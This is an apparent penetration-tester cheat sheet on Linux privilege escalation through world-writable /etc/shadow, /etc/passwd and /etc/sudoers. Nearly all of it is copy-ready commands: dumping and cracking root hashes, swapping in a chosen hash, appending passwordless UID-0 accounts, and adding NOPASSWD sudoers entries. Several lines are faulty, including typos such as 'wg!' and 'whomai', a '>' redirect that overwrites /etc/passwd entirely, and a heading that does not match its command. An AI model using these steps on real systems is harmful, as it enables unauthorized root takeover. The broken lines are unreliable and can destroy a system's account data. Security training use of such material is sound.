# World-Writable Files
If config files like /etc/passwd, /etc/shadow, or /etc/sudoers are writable, you can manipulate them for privilege escalation.
As an ethical hacker or penetration tester, exploiting world-writable files is a common technique for privilege escalation on Linux systems. World-writable files allow any user to write to them, which can be leveraged to gain higher privileges. Here are some techniques to exploit world-writable files for privilege escalation:

## 📌/etc/shadow file:
The /etc/shadow file contains user password hashes and is usually readable only by the root user.

### Method-1️⃣: Crack Password using John The Ripper.
Try to Creach the password using John The Ripper.
```
ls -la /etc/shadow		# → Check the /etc/shadow file permission
cat /etc/shadow			# → View the content.
```
Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
Save the root user hash into a file called hash.txt in your attacking machine.
Crack the password:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Switch to the root user using the cracked password
```
su root
```

### Method-2️⃣: Replace the password hash for root users in /etc/shadow file with our encrypted password.
Generate a new password hash with a password of your choice:
```
mkpasswd -m sha-512 newpasswordhere
```
Copy the ouput --> Then.
```
vim /etc/shadow
```
Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
```
:wq!
su root
id && whoami
```

### Method-3️⃣: Crack Password using hashcat.
View the content of the /etc/passwd and /etc/shadow files.
```
cat /etc/passwd
cat /etc/shadow
```
Copy or Save the content in attacking machine.
```
vim passwd.txt
# → Paste the /etc/passwd file content
:wq

vim shadow.txt
# → Paste the /etc/shadow file content
:wq
```
Crack the password
```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

## 📌/etc/passwd file:
The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
Note that the /etc/passwd file is world-writable:
```
ls -la /etc/passwd
```

### Method-1️⃣: Add new user to the system with GID and UID of 0 
```
echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
su - root2
id && whoami
```

### Method-2️⃣:  Remove root's password
```
vi /etc/passwd
# → Remove X (Password Holder) for root
wg!
su root
id && whoami

#or

echo root::0:0:root:/root:/bin/bash > /etc/passwd
id && whomai
```

### Method-3️⃣: Replace the password hash for existing users in /etc/passwd file with our encrypted password.
```
openssl passwd -1 -salt ignite NewRootPassword
# → Copy output
echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
# → Replace <output> with the copied output
su root2
id && whoami
```

## 📌/etc/sudores file:
/etc/sudoers File Controls who can run what commands as root or other users using sudo. It defines user and group permissions for sudo.
Allows privilege escalation by letting certain users execute commands as another user (typically root).

### Method-1️⃣: Edit or modify /etc/sudoers files and Allow for your current user.
```
echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers  # → Replace <username> with your current user (Example: www-data)
sudo su
id && whoami
```

### Method-2️⃣: Use SUDO without password
```
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```
